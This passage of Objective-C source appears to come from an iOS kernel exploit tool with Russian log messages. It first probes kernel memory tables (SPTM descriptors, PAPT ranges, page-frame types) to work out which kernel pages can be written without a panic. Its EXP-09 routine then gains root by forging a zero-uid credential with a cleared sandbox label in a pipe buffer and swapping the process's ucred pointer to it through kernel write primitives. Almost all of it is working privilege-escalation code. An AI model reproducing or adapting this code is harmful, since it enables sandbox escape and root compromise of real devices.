            uint64_t lo = kconstant(staticSptmBase), hi = lo + 0xF4000;
            for (size_t i = 0; i < descCount; i++) {
                const uint8_t *d = desc + i * descSize;
                for (int f = 0; f < 4; f++) {
                    static const int offs[4] = { 0x00, 0x08, 0x20, 0x30 };
                    uint64_t raw = 0;
                    memcpy(&raw, d + offs[f], 8);
                    uint64_t va = kp_untag_ptr(raw);
                    if (va >= lo && va < hi) sptmHits++;
                }
            }
        }
        if (sptmHits < 8) {
            kpNote(r, [NSString stringWithFormat:@"  pointee дескрипторов читается как СТАБЫ/код (SPTM-хуков %d) — это function table, не данные; ищем data-страницу по контенту", sptmHits]);
            descVA = 0;
            // content-scan pointee pages
            NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:nil];
            uint64_t bestVA = 0;
            int bestHits = 0;
            for (NSNumber *pv in pointees) {
                uint64_t pageVA = pv.unsignedLongLongValue;
                uint8_t *pageBuf = malloc(0x4000);
                memset(pageBuf, 0, 0x4000);
                BOOL ok = YES;
                for (uint64_t off = 0; ok && off < 0x4000; off += 0x400) {
                    ok = kpRead(pageVA + off, pageBuf + off, 0x400, "desc scan", nil);
                }
                if (ok && kconstant(staticSptmBase)) {
                    uint64_t lo = kconstant(staticSptmBase), hi = lo + 0xF4000;
                    int hits = 0;
                    for (uint32_t q = 0; q + 8 <= 0x4000; q += 8) {
                        uint64_t raw = 0;
                        memcpy(&raw, pageBuf + q, 8);
                        uint64_t va = kp_untag_ptr(raw);
                        if (va >= lo && va < hi) hits++;
                    }
                    if (hits > bestHits) { bestHits = hits; bestVA = pageVA; }
                }
                free(pageBuf);
            }
            if (bestVA) {
                kpNote(r, [NSString stringWithFormat:@"  дескрипторная data-страница: 0x%016llx (SPTM-указателей: %d)", bestVA, bestHits]);
                memset(desc, 0, descCount * descSize);
                if (kpRead(bestVA, desc, descCount * descSize, "descriptor data page", r)) {
                    descVA = bestVA;
                }
            }
            else {
                kpNote(r, @"  дескрипторная таблица не найдена среди pointee-страниц");
            }
        }
    }

    if (descVA) {
        kpNote(r, [NSString stringWithFormat:@"  дескрипторы @ 0x%016llx (63 × 0x60):", descVA]);
        [r appendString:@"   [idx] cls=b0/b1/b2 @+0x18, маски @+0x28/@+0x38, хуки @+0x00/+0x08/+0x20/+0x30 (sptm+off при известном слайде)\n"];
        for (size_t i = 0; i < descCount; i++) {
            const uint8_t *d = desc + i * descSize;
            uint64_t fn0 = 0, fn1 = 0, fn2 = 0, fn3 = 0, m28 = 0, m38 = 0;
            memcpy(&fn0, d + 0x00, 8);
            memcpy(&fn1, d + 0x08, 8);
            memcpy(&m28, d + 0x28, 8);
            memcpy(&fn2, d + 0x20, 8);
            memcpy(&fn3, d + 0x30, 8);
            memcpy(&m38, d + 0x38, 8);
            [r appendFormat:@"   [%02zu] cls=%02x/%02x/%02x m28=0x%010llx m38=0x%010llx | %@ %@ %@ %@\n",
                i, d[0x18], d[0x19], d[0x1a],
                (unsigned long long)m28, (unsigned long long)m38,
                kpFmtSptmFn(fn0), kpFmtSptmFn(fn1), kpFmtSptmFn(fn2), kpFmtSptmFn(fn3)];
        }
    }
    free(desc);

    // PAPT hunt: content-validate block pointees. 24-B format (spec §6.3)
    // first; then the 16-B fast-path format (§5.3, entries at +8, stride 16),
    // +0x68 slot (state +112) first for the 16-B try.
    uint64_t paptVA = 0;
    uint64_t paptN = 0;
    uint32_t paptFmt = 0;
    NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:nil];
    // 24-B hunt
    for (NSNumber *pv in pointees) {
        uint64_t cand = pv.unsignedLongLongValue;
        uint8_t first2[48];
        memset(first2, 0, sizeof(first2));
        if (!kpRead(cand, first2, sizeof(first2), "papt candidate 24B", r)) continue;
        if (kpPaptEntryPlausible(first2) && kpPaptEntryPlausible(first2 + 24)) {
            paptVA = cand;
            paptFmt = 0;
            kpNote(r, [NSString stringWithFormat:@"  PAPT (24-B): найдена @ 0x%016llx", cand]);
            break;
        }
    }
    // 16-B hunt (+0x68 slot = state +112 first, per §5.2)
    if (!paptVA && pointees.count) {
        NSMutableArray<NSNumber *> *order = [NSMutableArray array];
        // the +0x68 slot's pointee is pointees[13] (index 0x68/8); try it first
        if (pointees.count > 13) [order addObject:pointees[13]];
        for (NSNumber *pv in pointees) {
            if (![order containsObject:pv]) [order addObject:pv];
        }
        for (NSNumber *pv in order) {
            uint64_t cand = pv.unsignedLongLongValue;
            uint8_t first3[64];
            memset(first3, 0, sizeof(first3));
            if (!kpRead(cand, first3, sizeof(first3), "papt candidate 16B", r)) continue;
            // entries at +8, stride 16: {va_base, start_pfn:u32@8, count:u24@12}
            BOOL ok = YES;
            for (int e = 0; e < 2; e++) {
                uint32_t pfn = 0, cntRaw = 0;
                memcpy(&pfn, first3 + 8 + e * 16, 4);
                memcpy(&cntRaw, first3 + 8 + e * 16 + 8, 4);
                uint64_t pa = (uint64_t)pfn * 0x4000;
                uint32_t cnt = cntRaw & 0xFFFFFF;
                if (pa >= 0x400000000ULL || cnt == 0 || cnt > 0x100000) { ok = NO; break; }
            }
            if (ok) {
                paptVA = cand;
                paptFmt = 1;
                kpNote(r, [NSString stringWithFormat:@"  PAPT (16-B fast-path): найдена @ 0x%016llx", cand]);
                break;
            }
        }
    }

    if (paptVA) {
        // count ranges: u32 at symbol, else pointer-chase, else walk
        uint32_t n = 0;
        if (ksymbol(libsptm_n_papt_ranges)) {
            kpRead(ksymbol(libsptm_n_papt_ranges), &n, sizeof(n), "libsptm_n_papt_ranges", r);
            if (n == 0 || n > 64) {
                uint64_t nptr = 0;
                if (kpRead(ksymbol(libsptm_n_papt_ranges), &nptr, sizeof(nptr), "n_papt_ranges ptr", r)) {
                    nptr = kp_untag_ptr(nptr);
                    if (kpLooksLikeKernelPointer(nptr)) kpRead(nptr, &n, sizeof(n), "n_papt_ranges chase", r);
                }
            }
        }
        if (n == 0 || n > 64) {
            // walk until the signature breaks
            n = 0;
            while (n < 64) {
                uint8_t ent[24];
                memset(ent, 0, sizeof(ent));
                uint64_t eVA = paptFmt == 1 ? paptVA + 8 + n * 16 : paptVA + n * 24;
                if (!kpRead(eVA, ent, sizeof(ent), "papt walk", r)) break;
                if (paptFmt == 1) {
                    uint32_t pfn = 0, cntRaw = 0;
                    memcpy(&pfn, ent, 4);
                    memcpy(&cntRaw, ent + 8, 4);
                    uint64_t pa = (uint64_t)pfn * 0x4000;
                    uint32_t cnt = cntRaw & 0xFFFFFF;
                    if (pa >= 0x400000000ULL || cnt == 0 || cnt > 0x100000) break;
                }
                else {
                    if (!kpPaptEntryPlausible(ent)) break;
                }
                n++;
            }
        }
        paptN = n;
        kpNote(r, [NSString stringWithFormat:@"  PAPT: table=0x%016llx n=%llu fmt=%s", paptVA, (unsigned long long)paptN, paptFmt ? "16-B" : "24-B"]);

        for (uint64_t i = 0; i < paptN && i < 32; i++) {
            uint8_t ent[24];
            memset(ent, 0, sizeof(ent));
            uint64_t eVA = paptFmt == 1 ? paptVA + 8 + i * 16 : paptVA + i * 24;
            if (!kpRead(eVA, ent, sizeof(ent), "papt entry", r)) break;
            uint64_t paddr = 0, vabase = 0;
            uint32_t count = 0;
            if (paptFmt == 1) {
                memcpy(&vabase, ent, 8);
                uint32_t pfn = 0, cntRaw = 0;
                memcpy(&pfn, ent + 8, 4);
                memcpy(&cntRaw, ent + 12, 4);
                paddr = (uint64_t)pfn * 0x4000;
                count = cntRaw & 0xFFFFFF;
            }
            else {
                memcpy(&paddr, ent, 8);
                memcpy(&vabase, ent + 8, 8);
                memcpy(&count, ent + 16, 4);
            }
            [r appendFormat:@"    papt[%02llu] pa=0x%010llx va=0x%016llx pages=%u (pa …+0x%llx)\n",
                (unsigned long long)i, (unsigned long long)paddr,
                (unsigned long long)vabase, count,
                (unsigned long long)count * 0x4000];
        }

        kp_papt_table_va = paptVA;
        kp_papt_table_n = paptN;
        kp_papt_format = paptFmt;
    }
    else {
        kpNote(r, @"  PAPT-таблица не найдена среди pointees (24-B и 16-B) — kvtophys недоступен");
    }

    // Translation self-check: VA-mode (cpu_ttep stripped as VA) vs PA-mode
    // (TTBR phys). Accept whichever yields a plausible PA for the kernel base.
    BOOL translOK = NO;
    if (kp_papt_table_va) {
        uint64_t basePA = 0;
        const char *mode = "нет";
        if (gCpuTtepVA && kpLooksLikeKernelPointer(gCpuTtepVA)) {
            gSystemInfo.kernelConstant.cpuTTEP = gCpuTtepVA;
            errno = 0;
            uint64_t pa = kvtophys(kconstant(base));
            kpNote(r, [NSString stringWithFormat:@"  kvtophys VA-режим: base → PA=0x%010llx (errno=%d)", (unsigned long long)pa, errno]);
            if (pa && pa < 0x400000000ULL) { basePA = pa; mode = "VA"; }
        }
        if (!basePA && kconstant(cpuTTEP)) {
            gSystemInfo.kernelConstant.cpuTTEP = gCpuTtepPhys;
            errno = 0;
            uint64_t pa = kvtophys(kconstant(base));
            kpNote(r, [NSString stringWithFormat:@"  kvtophys PA-режим (TTBR): base → PA=0x%010llx (errno=%d)", (unsigned long long)pa, errno]);
            if (pa && pa < 0x400000000ULL) { basePA = pa; mode = "PA(TTBR)"; }
        }
        if (basePA) {
            translOK = YES;
            kpNote(r, [NSString stringWithFormat:@"  kvtophys работает: режим=%s, kernel base PA=0x%010llx", mode, (unsigned long long)basePA]);
        }
        else {
            kpNote(r, @"  kvtophys не работает ни в одном режиме — калибровка типов пропущена");
        }
    }

    // Frame-type calibration on known-role anchors, then a sampled sweep.
    if (tableVA && translOK) {
        [r appendString:@"\n  Калибровка типов фреймов (kvtophys + fte[2]):\n"];
        struct { const char *role; uint64_t va; } anchors[4];
        int na = 0;
        anchors[na].role = "kernel text (base)"; anchors[na].va = kconstant(base); na++;
        if (gCpuTtepVA && kpLooksLikeKernelPointer(gCpuTtepVA)) {
            anchors[na].role = "корень TT (cpu_ttep VA)"; anchors[na].va = gCpuTtepVA; na++;
        }
        anchors[na].role = "frame table (сама)"; anchors[na].va = tableVA; na++;
        uint64_t selfProc = [self findSelfProcByComm:r];
        if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
        if (selfProc) {
            anchors[na].role = "наш proc (heap)"; anchors[na].va = selfProc; na++;
        }
        for (int i = 0; i < na; i++) {
            errno = 0;
            uint64_t pa = kvtophys(anchors[i].va);
            int type = (pa != 0) ? kpFrameTypeOfPALogged(tableVA, pa, r) : -1;
            kpNote(r, [NSString stringWithFormat:@"    %-24s VA=0x%016llx PA=0x%010llx type=%@",
                      anchors[i].role, (unsigned long long)anchors[i].va,
                      (unsigned long long)pa,
                      type < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", type]]);
            if (selfProc && anchors[i].va == selfProc && type >= 0) {
                gHeapFrameType = (uint8_t)type;
                gHeapTypeKnown = YES;
            }
        }

        if (paptVA && paptN) {
            [r appendString:@"\n  Развёртка типов по PAPT-диапазонам (выборка ≤16 страниц на диапазон):\n"];
            NSMutableDictionary<NSNumber *, NSNumber *> *hist = [NSMutableDictionary dictionary];
            uint64_t sampled = 0;
            for (uint64_t i = 0; i < paptN && i < 32; i++) {
                uint8_t ent[24];
                memset(ent, 0, sizeof(ent));
                uint64_t eVA = paptFmt == 1 ? paptVA + 8 + i * 16 : paptVA + i * 24;
                if (!kpRead(eVA, ent, sizeof(ent), "papt entry", r)) break;
                uint64_t paddr = 0;
                uint32_t count = 0;
                if (paptFmt == 1) {
                    uint32_t pfn = 0, cntRaw = 0;
                    memcpy(&pfn, ent, 4);
                    memcpy(&cntRaw, ent + 8, 4);
                    paddr = (uint64_t)pfn * 0x4000;
                    count = cntRaw & 0xFFFFFF;
                }
                else {
                    memcpy(&paddr, ent, 8);
                    memcpy(&count, ent + 16, 4);
                }
                uint32_t step = count / 16 ? count / 16 : 1;
                for (uint32_t pg = 0; pg < count && pg / step < 16; pg += step) {
                    int t = kpFrameTypeOfPAQuiet(tableVA, paddr + (uint64_t)pg * 0x4000);
                    if (t < 0) continue;
                    NSNumber *key = @(t & 0xff);
                    hist[key] = @(hist[key].unsignedIntValue + 1);
                    sampled++;
                }
            }
            NSArray<NSNumber *> *types = [hist.allKeys sortedArrayUsingSelector:@selector(compare:)];
            for (NSNumber *t in types) {
                [r appendFormat:@"    type 0x%02x: %u страниц%s\n",
                    t.unsignedIntValue, hist[t].unsignedIntValue,
                    (gHeapTypeKnown && t.unsignedIntValue == gHeapFrameType) ? "  ← XNU_DEFAULT (heap, writable)" : ""];
            }
            kpNote(r, [NSString stringWithFormat:@"  всего отсемплировано: %llu страниц", (unsigned long long)sampled]);
        }
    }
    else if (tableVA) {
        kpNote(r, @"  калибровка типов: пропущена (нет рабочей трансляции)");
    }

    if (gHeapTypeKnown) {
        [r appendFormat:@"\n  ПРЕДИКАТ ЗАПИСИ: type == 0x%02x (калибровано по нашему proc) ⇔ kwrite без паники; всё остальное — фолт в physical aperture\n",
            gHeapFrameType];
    }
    else {
        [r appendString:@"\n  ПРЕДИКАТ ЗАПИСИ: не калиброван (нет PAPT/kvtophys) — запись только после ручной проверки\n"];
    }
    [r appendString:@"\n=== EXP-01..03 завершены (read-only, паники быть не должно) ===\n"];
    return r;
}

#pragma mark - EXP-09: ucred pointer-swap root (heap-only)

+ (NSString *)ucredHeapSwapReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== EXP-09: root через подмену указателя p_ucred (heap-only) ===\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }

    // 1. Own proc via the fixed allproc (EXP-01). The comm route is
    //    authoritative (independent of p_pid); the pid route is the fallback.
    pid_t selfPid = getpid();
    kpNote(r, [NSString stringWithFormat:@"  наш pid: %d", selfPid]);
    uint64_t selfProc = [self findSelfProcByComm:r];
    if (!selfProc) selfProc = [self findProcByPid:(uint32_t)selfPid log:r];
    if (!selfProc) {
        [r appendString:@"FAIL: свой proc не найден в allproc\n"];
        return r;
    }
    if (gCommOff) {
        uint8_t full[0x400];
        memset(full, 0, sizeof(full));
        if (kpRead(selfProc, full, sizeof(full), "self proc", r)) {
            char comm[33] = {0};
            memcpy(comm, full + gCommOff, 32);
            kpNote(r, [NSString stringWithFormat:@"  comm нашего proc: \"%s\" (ждём KexProof)", comm]);
        }
    }

    // 2. Locate the ucred pointer field. The 18.6 ladder: proc.ucred is a
    //    tombstone (moved at 15.2); the live one is proc_ro->ucred at
    //    *(proc+0x18) + 0x28. The spec's 0xD8 slot is logged for comparison.
    uint64_t legacyRaw = 0;
    kpRead(selfProc + 0xD8, &legacyRaw, sizeof(legacyRaw), "proc+0xD8 (legacy ucred)", r);
    kpNote(r, [NSString stringWithFormat:@"  proc+0xD8 = 0x%016llx (мёртвое поле на 15.2+; ucred уехал в proc_ro)",
              (unsigned long long)legacyRaw]);

    uint64_t procRoRaw = 0;
    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &procRoRaw, sizeof(procRoRaw), "proc.proc_ro", r)) {
        [r appendString:@"FAIL: proc.proc_ro не прочитан\n"];
        return r;
    }
    uint64_t procRo = kp_untag_ptr(procRoRaw);
    kpNote(r, [NSString stringWithFormat:@"  proc_ro: raw=0x%016llx → 0x%016llx",
              (unsigned long long)procRoRaw, (unsigned long long)procRo]);
    if (!kpLooksLikeKernelPointer(procRo)) {
        [r appendString:@"FAIL: proc_ro не kernel-указатель\n"];
        return r;
    }

    uint64_t ucredSlot = procRo + koffsetof(proc_ro, ucred);
    uint64_t curUcredRaw = 0;
    if (!kpRead(ucredSlot, &curUcredRaw, sizeof(curUcredRaw), "proc_ro.ucred", r)) {
        [r appendString:@"FAIL: proc_ro.ucred не прочитан\n"];
        return r;
    }
    uint64_t curUcred = kp_untag_ptr(curUcredRaw);
    kpNote(r, [NSString stringWithFormat:@"  proc_ro.ucred @ %#llx: raw=0x%016llx → 0x%016llx",
              (unsigned long long)ucredSlot, (unsigned long long)curUcredRaw, (unsigned long long)curUcred]);
    if (!kpLooksLikeKernelPointer(curUcred)) {
        [r appendString:@"FAIL: ucred не kernel-указатель\n"];
        return r;
    }

    // Validate the field: cr_uid (+0x18) must equal getuid().
    uint8_t realCred[0x120];
    memset(realCred, 0, sizeof(realCred));
    if (!kpRead(curUcred, realCred, sizeof(realCred), "current ucred", r)) {
        [r appendString:@"FAIL: текущий ucred не читается\n"];
        return r;
    }
    uint32_t curUid = 0, curGid = 0;
    memcpy(&curUid, realCred + 0x18, sizeof(curUid));
    memcpy(&curGid, realCred + 0x28, sizeof(curGid));
    kpNote(r, [NSString stringWithFormat:@"  текущий ucred: uid=%u gid=%u (getuid()=%d getgid()=%d)",
              curUid, curGid, getuid(), getgid()]);
    if (curUid != (uint32_t)getuid()) {
        [r appendString:@"FAIL: cr_uid не совпал с getuid() — поле не подтверждено, запись отменена\n"];
        return r;
    }

    // 3. Forge a ucred copy in a pipe buffer — XNU_DEFAULT heap we own. The
    //    pipe is never closed: the forged object stays permanent (spec §3).
    static int sForgePipe[2] = { -1, -1 };
    if (sForgePipe[0] < 0) {
        if (pipe(sForgePipe) != 0) {
            [r appendString:@"FAIL: pipe()\n"];
            return r;
        }
    }

    static const uint8_t kForgeMagic[16] = { 'K','P','R','C','R','E','D','1','K','P','R','C','R','E','D','1' };
    uint8_t forge[16 + 0x120];
    memset(forge, 0, sizeof(forge));
    memcpy(forge, kForgeMagic, sizeof(kForgeMagic));
    memcpy(forge + 16, realCred, sizeof(realCred));
    memset(forge + 16 + 0x18, 0, 12);  // cr_uid / cr_ruid / cr_svuid = 0
    memset(forge + 16 + 0x28, 0, 4);   // cr_groups[0] (primary gid) = 0
    memset(forge + 16 + 0x68, 0, 8);   // cr_rgid / cr_svgid = 0
    memset(forge + 16 + 0x78, 0, 8);   // cr_label = NULL — cleared MAC label
    uint32_t ref = 0;
    memcpy(&ref, realCred + 0x10, sizeof(ref));
    ref += 0x1000;                     // refcount bump: exit-time unref never frees
    memcpy(forge + 16 + 0x10, &ref, sizeof(ref));

    ssize_t wr = write(sForgePipe[1], forge, sizeof(forge));
    if (wr != (ssize_t)sizeof(forge)) {
        [r appendString:@"FAIL: write в pipe\n"];
        return r;
    }

    // 4. Find the pipe buffer's kernel VA via our own fd table, then confirm
    //    by the magic header (no pipe-layout offsets hardcoded).
    uint64_t fdPtr = 0;
    kpRead(selfProc + koffsetof(proc, fd), &fdPtr, sizeof(fdPtr), "proc.fd", r);
    uint64_t fdTable = kp_untag_ptr(fdPtr);
    uint64_t ofilesVA = fdTable + 0x28; // filedesc.ofiles_start (16+ ladder)
    kpNote(r, [NSString stringWithFormat:@"  fd table=0x%016llx ofiles=0x%016llx wfd=%d",
              (unsigned long long)fdTable, (unsigned long long)ofilesVA, sForgePipe[1]]);

    uint64_t fpRaw = 0, globRaw = 0, dataRaw = 0;
    kpRead(ofilesVA + (uint64_t)sForgePipe[1] * 8, &fpRaw, sizeof(fpRaw), "ofiles[wfd]", r);
    uint64_t fileprocVA = kp_untag_ptr(fpRaw);
    kpRead(fileprocVA + 0x10, &globRaw, sizeof(globRaw), "fileproc.glob", r);
    uint64_t globVA = kp_untag_ptr(globRaw);
    kpRead(globVA + 0x38, &dataRaw, sizeof(dataRaw), "fileglob.data", r);
    uint64_t pipeVA = kp_untag_ptr(dataRaw);
    kpNote(r, [NSString stringWithFormat:@"  fileproc=0x%016llx glob=0x%016llx pipe=0x%016llx",
              (unsigned long long)fileprocVA, (unsigned long long)globVA, (unsigned long long)pipeVA]);
    if (!kpLooksLikeKernelPointer(pipeVA)) {
        [r appendString:@"FAIL: pipe struct не найден по fd-таблице\n"];
        return r;
    }

    uint64_t bufferVA = 0;
    uint8_t pipeWin[0x100];
    memset(pipeWin, 0, sizeof(pipeWin));
    kpRead(pipeVA, pipeWin, sizeof(pipeWin), "pipe struct", r);
    for (int off = 0; off + 8 <= (int)sizeof(pipeWin) && !bufferVA; off += 8) {
        uint64_t q = 0;
        memcpy(&q, pipeWin + off, 8);
        uint64_t cand = kp_untag_ptr(q);
        if (!kpLooksLikeKernelPointer(cand)) continue;
        uint8_t probe[16];
        memset(probe, 0, sizeof(probe));
        if (!kpRead(cand, probe, sizeof(probe), "pipe buf candidate", r)) continue;
        if (memcmp(probe, kForgeMagic, 16) == 0) {
            bufferVA = cand;
        }
    }
    if (!bufferVA) {
        [r appendString:@"FAIL: буфер pipe не найден по магии KPRCRED1\n"];
        return r;
    }
    uint64_t forgedUcredVA = bufferVA + 16;
    kpNote(r, [NSString stringWithFormat:@"  буфер pipe=0x%016llx → forged ucred=0x%016llx",
              (unsigned long long)bufferVA, (unsigned long long)forgedUcredVA]);

    // 5. Writability pre-filter (spec §0): the pages we touch must be heap
    //    type. proc_ro is written by fork, so it must be XNU_DEFAULT.
    if (gFrameTableVA) {
        int tRo = -1, tBuf = -1;
        uint64_t pa = kvtophys(procRo);
        if (pa) tRo = kpFrameTypeOfPALogged(gFrameTableVA, pa, r);
        pa = kvtophys(bufferVA);
        if (pa) tBuf = kpFrameTypeOfPALogged(gFrameTableVA, pa, r);
        kpNote(r, [NSString stringWithFormat:@"  типы фреймов: proc_ro=%@ forge=%@ (heap=0x%02x)",
                  tRo < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tRo],
                  tBuf < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tBuf],
                  gHeapFrameType]);
        if (gHeapTypeKnown && ((tRo >= 0 && tRo != gHeapFrameType) || (tBuf >= 0 && tBuf != gHeapFrameType))) {
            [r appendString:@"FAIL: proc_ro или буфер НЕ heap-типа (RO-зона) — запись отменена до паники\n"];
            return r;
        }
    }
    else {
        [r appendString:@"  оракул типов недоступен — продолжаю без предфильтра (proc_ro пишется форком → обычная зона)\n"];
    }

    // 6. The swap: one 8-byte heap write. Original pointer saved for manual
    //    restore; never auto-restored (forged object must stay alive).
    static uint64_t sOrigUcred = 0;
    sOrigUcred = curUcred;
    kpNote(r, [NSString stringWithFormat:@"  оригинальный p_ucred = 0x%016llx (сохранён в лог; не восстанавливается)",
              (unsigned long long)sOrigUcred]);

    kwritebuf(ucredSlot, &forgedUcredVA, sizeof(forgedUcredVA));
    uint64_t rbRaw = 0;
    kpRead(ucredSlot, &rbRaw, sizeof(rbRaw), "p_ucred readback", r);
    uint64_t rb = kp_untag_ptr(rbRaw);
    kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
              (unsigned long long)rb, (unsigned long long)forgedUcredVA]);
    if (rb != forgedUcredVA) {
        [r appendString:@"FAIL: подмена не прилипла — kwrite по proc_ro не работает\n"];
        return r;
    }

    // 7. Verify.
    uid_t newUid = getuid();
    gid_t newGid = getgid();
    kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d getgid()=%d", newUid, newGid]);

    const char *probePath = "/private/var/root/kexproof-e9-probe.txt";
    errno = 0;
    FILE *f = fopen(probePath, "w");
    if (f) {
        fputs("kexproof e9\n", f);
        fclose(f);
        unlink(probePath);
        [r appendString:@"  /private/var/root: запись УДАЛАСЬ — sandbox не держит (label очищен)\n"];
    }
    else {
        kpNote(r, [NSString stringWithFormat:@"  /private/var/root: %s — uid уже root, но sandbox ещё действует (MAC label кеширован?)", strerror(errno)]);
    }

    if (newUid == 0) {
        [r appendString:@"\n=== EXP-09 PASS: uid 0 через heap-only pointer-swap. Записей в защищённую память не было. ===\n"];
        [r appendString:@"Форг живёт в pipe-буфере (fd'шки намеренно утёкшие). До перезагрузки мы root.\n"];
    }
    else {
        [r appendString:@"\n=== EXP-09 FAIL: указатель подменён, но getuid() не 0 — credential кешируется где-то ещё ===\n"];
    }
    return r;
}

@end
